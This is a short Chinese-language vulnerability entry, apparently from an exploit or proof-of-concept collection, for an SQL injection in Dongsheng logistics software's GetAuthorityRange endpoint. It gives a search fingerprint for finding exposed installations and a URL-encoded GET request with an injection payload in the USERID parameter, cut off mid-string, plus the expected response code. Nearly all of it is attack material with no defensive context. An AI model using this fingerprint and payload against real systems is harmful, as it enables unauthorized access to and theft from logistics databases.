# 东胜物流软件GetAuthorityRange存在SQL注入漏洞

东胜物流软件 ｜ SQL注入 ｜ —
- **指纹**：`body="FeeCodes/CompanysAdapter.aspx"`
- **请求**：`GET /CommMng/BasicDataRef/GetAuthorityRange?modName=-1&USERID=1%27%29%20AND%202619%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%20%28`
- **响应特征**：200